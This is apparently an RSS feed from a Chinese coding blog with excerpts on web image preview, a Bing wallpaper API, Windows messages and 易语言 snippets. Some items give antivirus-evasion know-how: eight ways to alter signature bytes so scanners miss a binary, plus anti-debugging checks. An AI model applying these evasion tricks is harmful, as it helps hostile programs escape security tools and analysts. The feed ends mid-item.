<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Code on ARAE</title><link>https://arae.cc/categories/code.html</link><description>Recent content in Code on ARAE</description><generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Thu, 26 Jul 2018 20:51:45 +0800</lastBuildDate><atom:link href="https://arae.cc/categories/code/index.xml" rel="self" type="application/rss+xml"/><item><title>前端上传图片并实现预览</title><link>https://arae.cc/post/25793.html</link><pubDate>Thu, 26 Jul 2018 20:51:45 +0800</pubDate><guid>https://arae.cc/post/25793.html</guid><description>在实际项目应用中，经常会使用到上传图片，并且可以让用户直接预览图片。对于此种做法有两种方法可以实现：一是前后台交互，后台将图片地址返回前端； 二是，使用FileReader对象——允许Web应用程序异步读取存储在用户计算机上的文件（或原始数据缓冲区）的内容；此种方法可以优化图片加载速度，减少方法一占用带宽的问题； &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt; &amp;lt;title&amp;gt;&amp;lt;/title&amp;gt; &amp;lt;script src=&amp;quot;js/jquery-1.8.3.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;input type=&amp;quot;file&amp;quot; id=&amp;quot;file&amp;quot; /&amp;gt; &amp;lt;img class=&amp;quot;img&amp;quot; id=&amp;quot;img&amp;quot; src=&amp;quot;&amp;quot; alt=&amp;quot;&amp;quot; /&amp;gt; &amp;lt;script&amp;gt; var File = document.getElementById(&#39;file&#39;); File.onchange = function(e){ var file = this.files[0]; console.log(this.files[0]) var reader = new FileReader(); reader.readAsDataURL(file); reader.onloadend = function (e) { console.log(e.target) document.getElementById(&#39;img&#39;).setAttribute(&amp;quot;src&amp;quot;,e.target.result); //e.target.result就是最后的路径地址 }; } &amp;lt;/script&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; 关键是reader.readAsDataURL(file)这句，可以把图片转成base64格式，让img标签读取</description></item><item><title>Bing每日壁纸API接口「十个国家版本」</title><link>https://arae.cc/post/25782.html</link><pubDate>Wed, 14 Mar 2018 23:49:26 +0800</pubDate><guid>https://arae.cc/post/25782.html</guid><description>前言 (瞎BB..) 这次在原有的国内版(中国)、国际版(美国)基础上又加了日本、印度、巴西、法国、德国、加拿大、澳大利亚、英国八个地区版本，不过就是图片重复率有点高，建议随便选个一直用@pp{你懂的} 接口在调用的时候空参数默认为「国际版(美国)302到图片地址」，而且POST方法仅支持返回JSON。 接口(API) 接口： //api.arae.cc/?p=bing 参数： s 地区版本，默认 0 ，可空 0 =&amp;gt; 美国 EN-US 1 =&amp;gt; 中国 ZH-CN 2 =&amp;gt; 日本 JA-JP 3 =&amp;gt; 印度 EN-IN 4 =&amp;gt; 巴西 PT-BR 5 =&amp;gt; 法国 FR-FR 6 =&amp;gt; 德国 DE-DE 7 =&amp;gt; 加拿大 EN-CA 8 =&amp;gt; 澳大利亚 EN-AU 9 =&amp;gt; 英国 EN-GB code json = 返回utf8 json数据(包括日期、地址、说明); null/undefined 或 其他则自动302到图片地址(可直接img标签调用); key 其实这个打算写出来自己用的，如果想用可以到留言板留言...具体格式参照api.arae.cc首页申请格式.. 返回参数说明 { &amp;quot;time&amp;quot;:&amp;quot;20180313&amp;quot;, /* 时间 */ &amp;quot;startdate&amp;quot;:&amp;quot;2018-03-13&amp;quot;, /* 开始时间 */ &amp;quot;enddate&amp;quot;:&amp;quot;2018-03-14&amp;quot;, /* 结束时间 */ &amp;quot;region&amp;quot;:&amp;quot;ZH-CN&amp;quot;, /* 缩写 */ &amp;quot;url&amp;quot;:&amp;quot;***.jpg&amp;quot;, /* 图片链接 */ &amp;quot;text&amp;quot;:&amp;quot;****&amp;quot; /* 图片相关说明 */ } 调用方法 GET: 返回 「中国版」 json数据(utf8) //api.arae.cc/?p=bing&amp;amp;code=json&amp;amp;s=1 { &amp;quot;time&amp;quot;:&amp;quot;20180313&amp;quot;, &amp;quot;startdate&amp;quot;:&amp;quot;2018-03-13&amp;quot;, &amp;quot;enddate&amp;quot;:&amp;quot;2018-03-14&amp;quot;, &amp;quot;region&amp;quot;:&amp;quot;ZH-CN&amp;quot;, &amp;quot;url&amp;quot;:&amp;quot;https://www.bing.com/az/hprichbg/rb/ToroidalBubble_ZH-CN10711997835_1920x1080.jpg&amp;quot;, &amp;quot;text&amp;quot;:&amp;quot;小巴哈马浅滩中的大西洋花斑原海豚和气泡环，巴哈马 (© Hiroya Minakuchi/Minden Pictures)&amp;quot; } 返回 「美国版」 json数据(utf8) //api.arae.cc/?p=bing&amp;amp;code=json { &amp;quot;time&amp;quot;:&amp;quot;20180314&amp;quot;, &amp;quot;startdate&amp;quot;:&amp;quot;2018-03-14&amp;quot;, &amp;quot;enddate&amp;quot;:&amp;quot;2018-03-15&amp;quot;, &amp;quot;region&amp;quot;:&amp;quot;EN-US&amp;quot;, &amp;quot;url&amp;quot;:&amp;quot;https://www.bing.com/az/hprichbg/rb/ToroidalBubble_EN-US9481815479_1920x1080.jpg&amp;quot;, &amp;quot;text&amp;quot;:&amp;quot;Atlantic spotted dolphins</description></item><item><title>Bing每日图片(壁纸)API接口</title><link>https://arae.cc/post/25776.html</link><pubDate>Tue, 27 Feb 2018 00:22:20 +0800</pubDate><guid>https://arae.cc/post/25776.html</guid><description>前言 (瞎BB..) [NEW] Bing每日壁纸API接口「十个国家版本」 Bing图片每日更新，对于这一点感觉挺不错的，如果能够把Bing每日图片作为博客背景是不是很不错呢？ 在用的时候注意区分下国内版跟国际版，有时候图片一样，但是描述全是鸟文&amp;hellip; 接口在调用的时候空参数默认为(国内版302到图片地址)，而且POST方法仅支持返回JSON。 接口(API) 接口： //api.arae.cc/?p=bing 参数： s 1 = 国内; null/undefined 或 其他值:国际版; code json = 返回utf8 json数据(包括日期、地址、说明); null/undefined 或 其他则自动302到图片地址(可直接img标签调用); key 其实这个打算写出来自己用的，如果想用可以到留言板留言...具体格式参照api.arae.cc首页申请格式.. PS:分辨率是 1920x1080 调用方法 GET: 返回 [国内版] json数据(utf8) //api.arae.cc/?p=bing&amp;amp;s=1&amp;amp;code=json { &amp;quot;time&amp;quot;:&amp;quot;20180226&amp;quot;, &amp;quot;url&amp;quot;:&amp;quot;https://www.bing.com/az/hprichbg/rb/CactiIslaPescado_ZH-CN11317505000_1920x1080.jpg&amp;quot;, &amp;quot;text&amp;quot;:&amp;quot;玻利维亚乌尤尼盐湖的仙人掌岛 (? Alex Saberi/Getty Images)&amp;quot; } 返回 [国际版] 版json数据(utf8) //api.arae.cc/?p=bing&amp;amp;code=json { &amp;quot;time&amp;quot;:&amp;quot;20180226&amp;quot;, &amp;quot;url&amp;quot;:&amp;quot;https://www.bing.com/az/hprichbg/rb/WoolBaySeadragon_EN-US12559454946_1920x1080.jpg&amp;quot;, &amp;quot;text&amp;quot;:&amp;quot;A leafy seadragon in the waters off Wool Bay, Australia (? Alex Mustard/Minden Pictures)&amp;quot; } 返回 [国内版] 图片 //api.arae.cc/?p=bing&amp;amp;s=1 Html: &amp;lt;img src=&amp;quot;//api.arae.cc/?p=bing&amp;amp;s=1&amp;quot; title=&amp;quot;Bing每日图片(壁纸) 国内版&amp;quot;&amp;gt; Markdown: ![&amp;quot;Bing每日图片(壁纸) 国内</description></item><item><title>SkinSharp函数文档</title><link>https://arae.cc/post/25760.html</link><pubDate>Sat, 16 Sep 2017 17:38:29 +0800</pubDate><guid>https://arae.cc/post/25760.html</guid><description>错误代码 错误代码： SRET_OK 0 操作成功 SRET_ERROR 1 操作失败 SRET_ERROR_READ 2 皮肤文件读取失败 SRET_ERROR_PARAM 3 参数错误 SRET_ERROR_CREATE 4 创建皮肤失败 SRET_ERROR_FORMAT 5 皮肤格式错误 SRET_ERROR_VERSION 6 皮肤版本错误 SRET_ERROR_PASSWORD 7 皮肤密码错误 SRET_ERROR_INVALID 8 皮肤引擎错误 SkinH_Attach SkinH_Attach： 函数原型：int SkinH_Attach(); 功能：加载程序当前目录下的文件名为skinh.she的皮肤进行换肤 参数：无 返回值：成功返回0，失败返回非0 SkinH_AttachEx SkinH_AttachEx: 函数原型：int SkinH_AttachEx(LPCTSTR strSkin, LPCTSTR strPwd); 功能:加载指定路径的皮肤进行换肤 参数： strSkin 表示的是皮肤文件路径 strPwd 表示的是皮肤密钥 返回值：成功返回0，失败返回非0 SkinH_AttachEx SkinH_AttachEx: 函数原型：int SkinH_AttachEx(LPCTSTR strSkin, LPCTSTR strPwd); 功能:加载指定路径的皮肤进行换肤 参数： strSkin 表示的是皮肤文件路径 strPwd 表示的是皮肤密钥 返回值：成功返回0，失败返回非0 SkinH_AttachRes SkinH_AttachRes: 函数原型：int SkinH_AttachRes(BYTE* pShe, int nSize, LPCTSTR strPwd, int nHue, int nSat, int nBri); 功能：加载指定资源进行换肤并指定相应的色调，饱和度，亮度 参数: pShe 资源皮肤数据指针 nSize 资源皮肤数据长度 strPwd 皮肤密钥 nHue 色调，取值范围-180-180,默认值0 nSat 饱和度，取值范围-100-100,默认值0 nBri 亮度，取值范围-100-100,默认值0 返回值：成功返回0，失败返回非0 SkinH_Detach SkinH_Detach： 函数原型:int SkinH_Detach(); 功能：卸载换肤 (注意:在换肤或者程序退出时换肤库会自动卸载当</description></item><item><title>颜值测试API，微软小冰颜值，颜值API</title><link>https://arae.cc/post/25740.html</link><pubDate>Wed, 17 Aug 2016 14:56:22 +0800</pubDate><guid>https://arae.cc/post/25740.html</guid><description>微软小冰颜值api http://kan.msxiaobing.com/Api/ImageAnalyze/Process?service=yanzhi 在使用前我们看一下效果 {&amp;quot;msgId&amp;quot;:&amp;quot;1461905520063&amp;quot;,&amp;quot;timestamp&amp;quot;:0,&amp;quot;receiverId&amp;quot;:null,&amp;quot;content&amp;quot;:{&amp;quot;text&amp;quot;:&amp;quot;颜值7.2分，再接再厉！捯饬捯饬，说不定就是男神了呢~&amp;quot;,&amp;quot;imageUrl&amp;quot;:&amp;quot;http:\\\\/\\\\/mediaplatform.trafficmanager.cn\\\\/image\\\\/fetchimage?key=UQAfAC8ABAAAAFcAFgAGABYASgBAADgAMQBFAEQARABGAEEAMgBGADkAQgBGAEYAQwA4AEEANQAxADgAMAA4AEEANgA2ADMAMwBFADMAMAA3AEEA&amp;quot;,&amp;quot;metadata&amp;quot;:{&amp;quot;w&amp;quot;:&amp;quot;scv9isnfUnZbhOfPjNnUjOfir-3Ave_sisfqiuTo</description></item><item><title>易语言特征码定位工具源码</title><link>https://arae.cc/post/25738.html</link><pubDate>Fri, 22 Jul 2016 09:28:51 +0800</pubDate><guid>https://arae.cc/post/25738.html</guid><description>调用API函数实现文件的特征码定位。 链接: http://pan.baidu.com/s/1kU5mE4B 密码: mwdx</description></item><item><title>时钟事件执行时间超出时钟周期问题解释</title><link>https://arae.cc/post/25737.html</link><pubDate>Thu, 21 Jul 2016 14:13:58 +0800</pubDate><guid>https://arae.cc/post/25737.html</guid><description>时钟组件 作为定时器 系统会在设定时间发送 WM_TIMER 消息给消息队列，因为事件处理函数和窗口回调函数都是同线程， 在一个消息未处理完返回之前是不能处理其他事件消息的，也就是一个时钟事件函数未执行完返回之前，系统是不会发送下一个 WM_TIMER 消息到消息队列中的，所以第二个WM_TIMER消息也就是会被忽略掉。 将时钟周期设置为500 1.下面这个例子你会发现 a 和b是同步的数值是相等的就是这个道理 .局部变量 a, 整数型, 静态 .局部变量 b, 整数型, 静态 a ＝ a ＋ 1 调试输出 (“a”, a) 延时 (1000) b ＝ b ＋ 1 调试输出 (“b”, b) 2.第二个例子很有意思，你会发现程序一直在输出a ，而没有输出b，呵呵，你来猜猜是什么原因？ .局部变量 a, 整数型, 静态 .局部变量 b, 整数型, 静态 a ＝ a ＋ 1 调试输出 (“a”, a) 延迟 (1000) b ＝ b ＋ 1 调试输出 (“b”, b) 第二个例子 和第一个例子的区别是把延时（）换成了延迟（），想来看看这两个命令的作用和区别，他们的区别一个是相当于暂停当前线程向下执行，等待设定长时间后在向下执行，但并不处理事件消息； 另一个是在等待中并且处理事件消息。那么为什么会出现这样的结果呢，首先来看一下延迟（）命令 他是在等待中处理消息队列中未决的消息，那么WM_T</description></item><item><title>禁止WebBrowser网页跳转时发出的声音</title><link>https://arae.cc/post/25721.html</link><pubDate>Fri, 15 Jul 2016 13:04:52 +0800</pubDate><guid>https://arae.cc/post/25721.html</guid><description>默认情况下，IE内核的网页浏览框(WebBrowser、CHtmlView、CHtmlDialog等控件)在跳转网页、点击按钮时会发出声音，用CoInternetSetFeatureEnabled这个API可以禁止掉。 易语言代码： .版本 2 .子程序 禁止网页跳转声音 CoInternetSetFeatureEnabled (#FEATURE_DISABLE_NAVIGATION_SOUNDS, #SET_FEATURE_ON_PROCESS, 1) .DLL命令 CoInternetSetFeatureEnabled, 整数型, &amp;quot;urlmon&amp;quot;, &amp;quot;CoInternetSetFeatureEnabled&amp;quot; .参数 FeatureEntry, 整数型, , INTERNETFEATURELIST .参数 dwFlags, 整数型, , DWORD .参数 fEnable, 整数型, , BOOL .常量 FEATURE_DISABLE_NAVIGATION_SOUNDS, &amp;quot;21&amp;quot;, , 禁止跳转声音 .常量 SET_FEATURE_ON_PROCESS, &amp;quot;2&amp;quot;, , 仅对当前进程有效 VC/C++代码： #include &amp;lt;urlmon.h&amp;gt; #ifndef FEATURE_DISABLE_NAVIGATION_SOUNDS #define FEATURE_DISABLE_NAVIGATION_SOUNDS 21 #endif #ifndef SET_FEATURE_ON_PROCESS #define SET_FEATURE_ON_PROCESS 0x00000002 #endif void DisableClickSounds() { CoInternetSetFeatureEnabled((INTERNETFEATURELIST)FEATURE_DISABLE_NAVIGATION_SOUNDS,SET_FEATURE_ON_PROCESS,true); } C#代码： const int FEATURE_DISABLE_NAVIGATION_SOUNDS = 21; const int SET_FEATURE_ON_PROCESS = 0x00000002; [DllImport(&amp;quot;urlmon.dll&amp;quot;)] [PreserveSig] [return: MarshalAs(UnmanagedType.Error)] static extern int CoInternetSetFeatureEnabled( int FeatureEntry, [MarshalAs(UnmanagedType.U4)] int dwFlags, bool fEnable); static void DisableClickSounds() { CoInternetSetFeatureEnabled( FEATURE_DISABLE_NAVIGATION_SOUNDS, SET_FEATURE_ON_PROCESS, true); }</description></item><item><title>Windows窗口消息大全</title><link>https://arae.cc/post/25715.html</link><pubDate>Thu, 14 Jul 2016 13:52:51 +0800</pubDate><guid>https://arae.cc/post/25715.html</guid><description>Windows窗口消息大全 ////////////////////////////////////////////////////////////////////////// #include &amp;quot;AFXPRIV.H&amp;quot;//消息值的定义来源 #include &amp;quot;Dde.h&amp;quot;//DDE消息值的定义来源 #include &amp;quot;CPL.H&amp;quot;//控制面板消息值的定义来源 #include &amp;quot;WFEXT.H&amp;quot;//文件管理器的消息值的定义来源 #include &amp;quot;vfw.h&amp;quot;//视频捕捉的消息值的定义来源 #include &amp;quot;ras.h&amp;quot;//RAS(远程访问服务)的消息值的定义来源 #include &amp;quot;imm.h&amp;quot;//输入法编辑器的消息值的定义来源 #include &amp;quot;tspi.h&amp;quot;//消息值的定义来源 #include &amp;quot;setupapi.h&amp;quot;//消息值的定义来源 ////////////////////////////////////////////////////////////////////////// #ifndef WM_SYSTIMER #define WM_SYSTIMER 0x0118 //(caret blink) #endif #define DRV_EXITAPPLICATION 0x000C //驱动程序消息相关 #define WM_HIBERNATE 0x03FF //WINCE独有的消息(内存资源限制相关) //窗口消息解码 #define IDSTR(MsgID) MsgID,#MsgID typedef struct { DWORD dwMsg; LPCTSTR szMsgText; LPCTSTR szNote; } t_MSGNOTE; static t_MSGNOTE messagesnote[] = { IDSTR(WM_NULL),&amp;quot;空消息,可检测程序是否有响应等&amp;quot;, IDSTR(WM_CREATE),&amp;quot;新建一个窗口&amp;quot;, IDSTR(WM_DESTROY),&amp;quot;销毁一个窗口&amp;q</description></item><item><title>易语言软件反调试大法——六种反调试方法，总有一种适合“它”！</title><link>https://arae.cc/post/25709.html</link><pubDate>Thu, 14 Jul 2016 10:43:20 +0800</pubDate><guid>https://arae.cc/post/25709.html</guid><description>备注：写成子程序是为了方便在应用时插到代码段中，真正使用时请务必插入（最好分段插入）到程序代码中，否则几乎形同虚设。 .版本 2 .子程序 第一法_内存分配反调试, 逻辑型 .参数 最小值, 整数型 .参数 最大值, 整数型 .局部变量 min, 整数型 .局部变量 max, 整数型 GetProcessWorkingSetSize (GetCurrentProcess (), min, max) &#39; 输出调试文本 (min, max) 返回 (min ≠ 最小值 或 max ≠ 最大值) .子程序 第二法_子窗口反调试 EnumChildWindows (GetDesktopWindow (), 到整数 (&amp;amp;子窗口监控子程序), 0) .子程序 第三法_时间差反调试, 逻辑型 .局部变量 ctt, FILETIME .局部变量 ett, FILETIME .局部变量 ktt, FILETIME .局部变量 utt, FILETIME .局部变量 stt, SystemTime .局部变量 ntt, SystemTime .局部变量 qtt, 双精度小数型 GetLocalTime (ntt) GetProcessTimes (GetCurrentProcess (), ctt, ett, ktt, utt) FileTimeToSystemTime (ctt, stt) qtt ＝ 到数值 (ntt.wSecond) × 1000 ＋ ntt.wMilliseconds － 到数值 (stt.wSecond) × 1000 － stt.wMilliseconds 返回 (qtt ＞ 300 或 qtt ＜ 0) .子程序 第四法_启动信息反调试, 逻辑型 .局部变量 启动信息, STARTUPINFO GetStartupInfo (启动信息) 返回 (启动信息.dwX ≠ 0 或 启动信息.dwY ≠ 0 或 启动信息.dwXCountChars ≠ 0 或 启动信息.dwYCountChars ≠ 0 或 启动信息.dwFillAttribute ≠ 0 或 启动信息.dwXSize ≠ 0 或 启动信息.dwYSize ≠ 0) .子程序 第五法_时间间隔反调试, 逻辑型 返回 (GetTickCount () － GetTickCount () ≠ 0) .子程序 第六法_检测调试器反调试, 逻辑型</description></item><item><title>易语言取外网ip的两种方法</title><link>https://arae.cc/post/25708.html</link><pubDate>Thu, 14 Jul 2016 10:41:05 +0800</pubDate><guid>https://arae.cc/post/25708.html</guid><description>易语言取外网ip的两种方法 方法一： .版本 2 .支持库 internet .子程序 取外网ip_文本操作, 文本型 .局部变量 内容, 文本型 .局部变量 开始位置, 整数型 .局部变量 长度, 整数型 .局部变量 网址, 文本型 .局部变量 开始标识符, 文本型 .局部变量 结束标识符, 文本型 网址 ＝ “http://www.net.cn/static/customercare/yourIP.asp” 开始标识符 ＝ “&amp;lt;h2&amp;gt;” 结束标识符 ＝ “&amp;lt;/h2&amp;gt;” 内容 ＝ 到文本 (HTTP读文件 (网址)) 开始位置 ＝ 寻找文本 (内容, 开始标识符, , 假) ＋ 取文本长度 (开始标识符) 长度 ＝ 取文本长度 (内容) － 取文本长度 (开始标识符) － 寻找文本 (内容, 开始标识符, , 假) － (取文本长度 (内容) － 寻找文本 (内容, 结束标识符, , 假)) 返回 (取文本中间 (内容, 开始位置, 长度)) 方法二： .版本 2 .支持库 RegEx .支持库 internet .子程序 取外网ip_正则操作, 文本型 .局部变量 开始标识符, 文本型 .局部变量 结束标识符, 文本型 .局部变量 正则, 正则表达式 .局部变量 结果, 搜索结果 .局部变量 内容, 文本型 .局部变量 网址, 文本型 开始标识符 ＝ “&amp;lt;h2&amp;gt;” 结束标识符 ＝ “&amp;lt;/h2&amp;</description></item><item><title>内存映射文件处理大文件</title><link>https://arae.cc/post/25705.html</link><pubDate>Tue, 12 Jul 2016 19:24:39 +0800</pubDate><guid>https://arae.cc/post/25705.html</guid><description>内存映射文件处理大文件 // 创建文件内核对象，其句柄保存于hFile HANDLE hFile = CreateFile(“Recv1.zip”,GENERIC_WRITE | GENERIC_READ,FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_FLAG_SEQUENTIAL_SCAN, NULL); // 创建文件映射内核对象，句柄保存于hFileMapping HANDLE hFileMapping = CreateFileMapping(hFile,NULL,PAGE_READWRITE, 0, 0x4000000, NULL); // 释放文件内核对象 CloseHandle(hFile); // 设定大小、偏移量等参数 __int64 qwFileSize = 0x4000000; __int64 qwFileOffset = 0; __int64 T = 600 * sinf.dwAllocationGranularity; DWORD dwBytesInBlock = 1000 * sinf.dwAllocationGranularity; // 将文件数据映射到进程的地址空间 PBYTE pbFile = (PBYTE)MapViewOfFile(hFileMapping,FILE_MAP_ALL_ACCESS,(DWORD)(qwFileOffset &amp;gt;&amp;gt;32), (DWORD)(qwFileOffset&amp;amp;0xFFFFFFFF), dwBytesInBlock); while(bLoop) { // 捕获事件hEvent[0]和事件hEvent[1] DWORD ret = WaitForMultipleObjects(2, hEvent, FALSE, INFINITE); ret -= WAIT_OBJECT_0; switch (ret) { // 接收数据事件触发 case 0: // 从端口接收数据并保存到内存映射文件 nReadLen=syio_Read(port[1], pbFile + qwFileOffset, QueueLen); qwFileOffset += nReadLen; // 当数据写满%时，为防数据溢出，需要在其后开辟一新的映射视图 if (qwFileOffset &amp;gt; T) { T = qwFileOffset + 600 * sinf.dwAllocationGranularity;UnmapViewOfFile(pbFile); pbFile = (PBYTE)MapViewOfFile(hFileMapping,FILE_MAP_ALL_ACCESS,(DWORD)(qwFileOffset&amp;gt;&amp;gt;32), (DWORD)(qwFileOffset&amp;amp;0xFFFFFFFF), dwBytesInBlock); } break; // 终止事件触发 case 1: bLoop = FALSE; // 从进程的地址空间撤消文件数据映像 UnmapViewOfFile(pbFile); // 关闭文件映射对象 CloseHandle(hFileMapping); break; } }… 在终止事件触发处理过程中如果只简单的执行UnmapViewOfFile()和CloseHandle()函数将无法正确标识文件 的实际大小，即如果开辟的内存映射文件为GB，而接收的数据只有GB，那么上述程序执行完后，保存的文 件长度仍是GB。也就是说，在处理完成后还要再次通过内存映射文件的形式将文件恢复到实</description></item><item><title>易语言5.5以后可以直接用的Manifest</title><link>https://arae.cc/post/25702.html</link><pubDate>Tue, 12 Jul 2016 13:42:32 +0800</pubDate><guid>https://arae.cc/post/25702.html</guid><description>易语言5.5以后可以直接用的Manifest &amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot; standalone=&amp;quot;yes&amp;quot;?&amp;gt; &amp;lt;assembly xmlns=&amp;quot;urn:schemas-microsoft-com:asm.v1&amp;quot; manifestVersion=&amp;quot;1.0&amp;quot;&amp;gt; &amp;lt;assemblyIdentity type=&amp;quot;win32&amp;quot; name=&amp;quot;xxx&amp;quot; version=&amp;quot;1.0.0.0&amp;quot; /&amp;gt; &amp;lt;!-- Windows XP style common controls --&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;dependentAssembly&amp;gt; &amp;lt;assemblyIdentity type=&amp;quot;win32&amp;quot; name=&amp;quot;Microsoft.Windows.Common-Controls&amp;quot; version=&amp;quot;6.0.0.0&amp;quot; processorArchitecture=&amp;quot;*&amp;quot; publicKeyToken=&amp;quot;6595b64144ccf1df&amp;quot; language=&amp;quot;*&amp;quot; /&amp;gt; &amp;lt;/dependentAssembly&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;!-- UAC settings --&amp;gt; &amp;lt;trustInfo xmlns=&amp;quot;urn:schemas-microsoft-com:asm.v2&amp;quot;&amp;gt; &amp;lt;security&amp;gt; &amp;lt;requestedPrivileges&amp;gt; &amp;lt;requestedExecutionLevel level=&amp;quot;asInvoker&amp;quot; uiAccess=&amp;quot;false&amp;quot; /&amp;gt; &amp;lt;/requestedPrivileges&amp;gt; &amp;lt;/security&amp;gt; &amp;lt;/trustInfo&amp;gt; &amp;lt;!-- Windows feature settings --&amp;gt; &amp;lt;application xmlns=&amp;quot;urn:schemas-microsoft-com:asm.v3&amp;quot;&amp;gt; &amp;lt;windowsSettings xmlns:ws=&amp;quot;http://schemas.microsoft.com/SMI/2005/WindowsSettings&amp;quot;&amp;gt; &amp;lt;ws:dpiAware&amp;gt;true&amp;lt;/ws:dpiAware&amp;gt; &amp;lt;/windowsSettings&amp;gt; &amp;lt;/application&amp;gt; &amp;lt;!-- Supported OS versions --&amp;gt; &amp;lt;compatibility xmlns=&amp;quot;urn:schemas-microsoft-com:compatibility.v1&amp;quot;&amp;gt; &amp;lt;application&amp;gt; &amp;lt;!-- Windows 10 --&amp;gt; &amp;lt;supportedOS Id=&amp;quot;{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}&amp;quot; /&amp;gt; &amp;lt;!-- Windows 8.1 --&amp;gt; &amp;lt;supportedOS Id=&amp;quot;{1f676c76-80e1-4239-95bb-83d0f6d0da78}&amp;quot; /&amp;gt; &amp;lt;!-- Windows 8 --&amp;gt; &amp;lt;supportedOS Id=&amp;quot;{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}&amp;quot; /&amp;gt; &amp;lt;!-- Windows 7 --&amp;gt; &amp;lt;supportedOS Id=&amp;quot;{35138b9a-5d96-4fbd-8e2d-a2440225f93a}&amp;quot; /&amp;gt; &amp;lt;!-- Windows Vista --&amp;gt; &amp;lt;supportedOS Id=&amp;quot;{e2011457-1546-43c5-a5fe-008deee3d3f0}&amp;quot; /&amp;gt; &amp;lt;/application&amp;gt; &amp;lt;/compatibility&amp;gt; &amp;lt;/assembly&amp;gt;</description></item><item><title>易语言 修改IE协议头模拟手机浏览网页</title><link>https://arae.cc/post/25700.html</link><pubDate>Mon, 11 Jul 2016 16:19:49 +0800</pubDate><guid>https://arae.cc/post/25700.html</guid><description>通过修改注册表，达到修改IE协议头的目的 注册路径 ＝ “SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\User Agent\Post Platform\” 两个文本变量装协议头 windows ＝ “Mozilla/4.0?(compatible;?MSIE?6.1;?Windows?XP)” android ＝ “Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1” 写手机协议注册表 写注册项 (#本地机器, 注册路径 ＋ android, android) 还原电脑协议注册表 写注册项 (#本地机器, 注册路径 ＋ windows, windows) 判断本地注册情况为何协议头 .如果 (注册项是否存在 (#本地机器, 注册路径 ＋ windows)) 删除注册项 (#本地机器, 注册路径 ＋ windows) .否则 .如果结束 .如果 (注册项是否存在 (#本地机器, 注册路径 ＋ android)) 删除注册项 (#本地机器, 注册路径 ＋ android) .否则</description></item><item><title>易语言 特征码的8种修改方法</title><link>https://arae.cc/post/25699.html</link><pubDate>Mon, 11 Jul 2016 16:18:05 +0800</pubDate><guid>https://arae.cc/post/25699.html</guid><description>1.NOP法 （常常检测自己是否定位正确） 2.加1法 （很牛B，很简单，但是不一定实用于每个特征码） 3.大小写替换（很好，很强大，修改后100%可以用！ 注意：PE头 函数 不能修改） 4.add ecx,2 可以改为 sub ecx,-2 (加ecx内存器＋2 减ecx内存器-2 - -2得＝2) （特征码：0046B897） 0046B897: 83C4 F0 ADD ESP,-10 sub ESP,10 5.push 变 pop (特征码：0046B96D) PUSH EBP—POP EBP PUSH EDX—POP EDX POP EDX—PUSH EDX 6.je 变 jnz (特征码：004230F6) LOOPD SHORT *.*—JNZ SHORT * 意思： JE——若ZF=1，则跳转 JMP——无条件跳转 JNZ——若ZF=0，则跳转搜索 PUSH——压栈 7.add 变 sub 8.call跳转 call A （原地址） 修改 call B (0区域) B的位置写 call A (原地址) 00423210: E8 3B1DFFFF CALL 00414F50 （原地址） 0049575C: 0000 ADD [EAX],AL (0区域) add=adc sbb=sub jmp=call jp=je</description></item><item><title>易语言ascii（ASCII）转码</title><link>https://arae.cc/post/25697.html</link><pubDate>Mon, 11 Jul 2016 16:16:06 +0800</pubDate><guid>https://arae.cc/post/25697.html</guid><description>ASCII 码使用指定的7 位或8 位二进制数组合来表示128 或256 种可能的字符。标准ASCII 码也叫基础ASCII码，使用7 位二进制数来表示所有的大写和小写字母，数字0 到9、标点符号， 以及在美式英语中使用的特殊控制字符。 ASCII是基于拉丁字母的一套电脑编码系统。它主要用于显示现代英语和其他西欧语言。它是现今最通用的单字节编码系统，并等同于国际标准ISO/IEC 646。 ASCII转码就是将类似编码“60,115,99,114,105,112,116,32,116,121,112,101,61,39,116,101,120,116” 变成字节集然后转化成文本​ 首先，分本分割，然后将每一数组转化成“字节” 然后，创建相同数量的0字节的字节集，用到的命令 取空白字节集 (取数组成员数 (数组)) 最后，将用计次循环，将字节逐个装入字节集中 将字节集到文本即可完成转换​ 到文本 (字节集)</description></item><item><title>易语言字节集动态加密</title><link>https://arae.cc/post/25696.html</link><pubDate>Mon, 11 Jul 2016 16:14:49 +0800</pubDate><guid>https://arae.cc/post/25696.html</guid><description>原理很简单： 字节集1（n位随机字节集） 字节集2（m位随机字节集） 被加密字节集=字节集1+被加密字节集+字节集2 被加密字后的字节集=加密（被加密字节集，密码） 解密后的字节集=解密（被解密字节集，密码） 解密后的字节集=字节集1+被加密字节集+字节集2 解密后的字节集=取字节集中间（解密后的字节集，n+1，取字节集长度 (解密后的字节集) -m-n） .版本 2 .支持库 dp1 .子程序 加密_加密or解密, 字节集 .参数 字节集数据, 字节集 .参数 加密or解密, 整数型, , 1加密,2解密 .局部变量 密码文本, 文本型 .局部变量 加密算法, 整数型 .局部变量 word, 文本型 .局部变量 mima1, 文本型 .局部变量 mima2, 文本型 .局部变量 字节集数据中间, 字节集 .如果真 (加密or解密 ≠ 1 或 加密or解密 ≠ 2) 返回 (字节集数据) .如果真结束 word ＝ “0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz!#$%&#39;()*+,-./:;&amp;lt;=&amp;gt;?@[\]^_`{|}~&amp;amp;” .计次循环首 (5, ) mima1 ＝ mima1 ＋ 取文本中间 (word, 取随机数 (1, 93), 1) mima2 ＝ mima2 ＋ 取文本中间 (word, 取随机数 (1, 93), 1) .计次循环尾 () 密码文本 ＝ “ww</description></item><item><title>易语言 